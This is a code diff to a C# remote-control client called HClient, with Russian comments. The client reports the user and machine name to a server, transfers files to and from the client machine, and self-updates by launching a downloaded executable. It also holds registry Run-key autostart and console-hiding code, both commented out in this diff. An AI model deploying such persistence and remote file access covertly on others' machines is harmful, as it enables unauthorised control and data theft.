@@ -29,6 +29,7 @@ namespace HClient
             {"introduce", 3},    //получение информации о клиенте
             {"upload", 4 },      //загрузка файла на компютер клиента
             {"load", 5 },        //скачивание файла с компьютера клиента
+            {"test", 6 },        //скачивание файла с компьютера клиента
             {"check", 100},      //получение информации о версии библиотеки
         };
 
@@ -44,13 +45,13 @@ namespace HClient
 
         static void Main(string[] args)
         {            
-            CheckAutoRun();
+            //CheckAutoRun();//проверка на запись в регистре
             var handle = GetConsoleWindow();
-            //ShowWindow(handle, SW_HIDE);
+            //ShowWindow(handle, SW_HIDE);//функция скрытия окна
 
             Console.Title = "Client";
             connectionIsOn = false;
-            currentDir = Environment.CurrentDirectory;// сохраненная директория
+            currentDir = AppDomain.CurrentDomain.BaseDirectory;// сохраненная директория
             Connection();
 
             checkConnection = new Thread(() =>
@@ -130,13 +131,13 @@ namespace HClient
             ms.Position = 0;
             writer.Write(Environment.UserName);
             writer.Write(Environment.MachineName);
-            writer.Write(Environment.CurrentDirectory);
+            writer.Write(AppDomain.CurrentDomain.BaseDirectory);
             mySocket.Send(ms.GetBuffer());
         }
 
         private static void Update()//обнавление версии
         {
-            string path = Environment.CurrentDirectory + "\\update.tmp";
+            string path = AppDomain.CurrentDomain.BaseDirectory + "\\update.tmp";
             using (FileStream fs = new FileStream(path, FileMode.OpenOrCreate))
             {
                 int leng = reader.ReadInt32();
@@ -148,7 +149,7 @@ namespace HClient
                 // считывает байт в память и переводит каретку на байт вперед
                 ms.Position = 0;
                 writer.Write("Загрузка завершена.");
-                Process.Start(Environment.CurrentDirectory + "\\HUpdater.exe");
+                Process.Start(AppDomain.CurrentDomain.BaseDirectory + "\\HUpdater.exe"); //замениел Environment.CurrentDirectory
                 Environment.Exit(0);
             }
         }
@@ -236,6 +237,9 @@ namespace HClient
                     ms.Position = 0;
                     writer.Write(5);//код операции
                     socket.Send(ms.GetBuffer());
+                    ms.Position = 0;
+                    socket.Receive(ms.GetBuffer());
+                    Console.WriteLine(reader.ReadInt32());
                     try
                     {
                         nameFile = reqOpt[1];
@@ -247,7 +251,7 @@ namespace HClient
                         }
                         else
                         {
-                            sendFile(ref socket, nameFile);
+                            sendFile(ref socket, pathF);
                             ms.Position = 0;
                             writer.Write("Done");
                         }
@@ -258,6 +262,23 @@ namespace HClient
                         ms.Position = 0;
                         writer.Write(-1);
                     }
+                    
+                    break;
+                case 6: //test                 
+                    ms.Position = 0;
+                    writer.Write(6);//код операции
+                    socket.Send(ms.GetBuffer());
+                    ms.Position = 0;
+                    socket.Receive(ms.GetBuffer());
+                    Console.WriteLine(reader.ReadString());
+                    ms.Position = 0;
+                    writer.Write("Test's OVER");
+                    socket.Send(ms.GetBuffer());
+                    ms.Position = 0;
+                    socket.Receive(ms.GetBuffer());
+                    Console.WriteLine(reader.ReadString());
+                    ms.Position = 0;
+                    writer.Write("Test's OVER numb 2");                    
                     break;
                 case 100: //возвращает информацию о версии                    
                     ms.Position = 0;
@@ -288,18 +309,23 @@ namespace HClient
                     ms.Position = 0;
                     writer.Write(lenghtfile);//передаем размер файла
                     writer.Write(nameF);//передаем имя
-                    socket.Send(ms.GetBuffer());//отсылаем                    
-                    socket.Receive(ms.GetBuffer());//отсылаем  
+                    socket.Send(ms.GetBuffer());//отсылаем                                                        
                     ms.Position = 0;
+                    socket.Receive(ms.GetBuffer());
+                    Console.WriteLine(reader.ReadInt32());
                     using (MemoryStream msF = new MemoryStream(new byte[lenghtfile], 0, lenghtfile, true, true))
                     {
-                        BinaryWriter writerF = new BinaryWriter(msF);
-                        fs.Read(data, 0, data.Length);
-                        msF.Position = 0;
-                        writerF.Write(data);
-                        socket.Send(msF.GetBuffer());
+                         BinaryWriter writerF = new BinaryWriter(msF);                       
+                         msF.Position = 0;
+                         writerF.Write(data);
+                         socket.Send(msF.GetBuffer());
 
+                         ms.Position = 0;
+                         socket.Receive(ms.GetBuffer());//get ok 
+                         Console.WriteLine(reader.ReadString());                         
                     }
+
+
                 }
             }
             catch (Exception ex)
@@ -314,7 +340,7 @@ namespace HClient
             {
                 BinaryReader readerFile = new BinaryReader(msFile);
                 byte[] data = new byte[lenghFile];
-                using (FileStream fs = new FileStream(Environment.CurrentDirectory + '\\' + nameFile, FileMode.Create))
+                using (FileStream fs = new FileStream(currentDir + '\\' + nameFile, FileMode.Create))
                 {
                     msFile.Position = 0;
                     socketF.Receive(msFile.GetBuffer());
@@ -348,7 +374,7 @@ namespace HClient
             RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             if (rkApp.GetValue("HClientStart") == null)
             {
-                rkApp.SetValue("HClient", Path.Combine(Directory.GetCurrentDirectory(), "HClient.exe"));
+                rkApp.SetValue("HClientStart", Path.Combine(Directory.GetCurrentDirectory(), "HClient.exe"));
             }
 
         }
